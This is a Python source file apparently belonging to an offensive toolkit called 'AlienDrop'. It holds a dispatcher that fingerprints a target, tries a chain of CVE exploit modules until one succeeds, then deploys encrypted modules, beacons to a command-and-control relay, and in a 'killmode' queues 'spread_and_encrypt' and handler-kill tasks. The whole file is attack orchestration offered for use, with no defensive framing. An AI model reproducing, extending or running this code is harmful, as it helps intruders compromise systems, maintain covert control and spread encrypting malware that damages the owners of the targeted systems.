# MINC - AlienDrop Exploit Dispatcher (Finalized v2)

import random
from recon.recon_fingerprint import fingerprint_target
from exploits.chaining_profile import get_chain
from modules.shell_logger import log_shell_report, package_shell_transfer
from modules.idgen import gen_shell_id
from modules.taskcli import queue_auto_tasks
from modules.encrypt_module import deploy_encrypted_module
from modules.drop_attitudes import get_attitude
from modules.beacon_logic import ping_beacon
from modules.relay_engine import send_command_relay

def dispatch_exploit_chain(target, recon_data, attitude="passive", modules=None):
    print(f"[=] Fingerprinting target: {target}")
    profile = fingerprint_target(recon_data)

    print(f"[=] Generating shell ID...")
    shell_id = gen_shell_id(profile)

    attitude_profile = get_attitude(attitude)
    print(f"[=] Attitude profile loaded: {attitude} â†’ {attitude_profile['tags']}")

    print(f"[=] Building CVE chain for {profile['platform']} ({profile['cms']})...")
    cve_chain = get_chain(profile)

    success = False
    for cve_module in cve_chain:
        print(f"[*] Attempting exploit: {cve_module.__name__}")
        try:
            success = cve_module.run(target, recon_data)
            if success:
                print(f"[+] Exploit succeeded: {cve_module.__name__}")
                break
        except Exception as e:
            print(f"[x] Exploit failed: {cve_module.__name__} ({e})")

    if not success:
        print(f"[!] All exploits failed for {target}")
        return None

    # Deploy selected modules
    selected_modules = modules or attitude_profile.get("auto_tasks", [])
    for module in selected_modules:
        print(f"[*] Deploying module: {module}")
        try:
            deploy_encrypted_module(target, shell_id, module)
        except Exception as e:
            print(f"[x] Deployment failed: {module} ({e})")

    # Beacon init
    if attitude_profile.get("beacon"):
        print(f"[=] Sending initial beacon for {shell_id}...")
        ping_beacon(shell_id, tags=attitude_profile['tags'], attitude=attitude, modules=selected_modules, beacon_type="init")

    # Metadata + logging
    tags = ["autodeployed"] + attitude_profile.get("tags", [])
    metadata = {
        "target": target,
        "platform": profile['platform'],
        "fingerprint": profile,
        "modules": selected_modules
    }

    log_shell_report(shell_id, tags, selected_modules, metadata)

    # Optional packaging
    if "client" in tags:
        package_shell_transfer(shell_id)

    # Queue tasks
    if selected_modules:
        queue_auto_tasks(shell_id, selected_modules)

    # Optional relay payloads
    if "relay" in tags:
        print(f"[relay] Shell marked for C2 relay â€” priming routing node.")
        send_command_relay(shell_id, "init_relay_node")

    # Killmode logic
    if attitude == "killmode":
        print(f"[ðŸ’€] Shell is flagged for killmode. Queueing self-destruct.")
        queue_auto_tasks(shell_id, ["spread_and_encrypt", "handler_kill", "memory_ejector"])

    print(f"[âœ“] Shell `{shell_id}` deployed with {len(selected_modules)} modules.")
    return shell_id

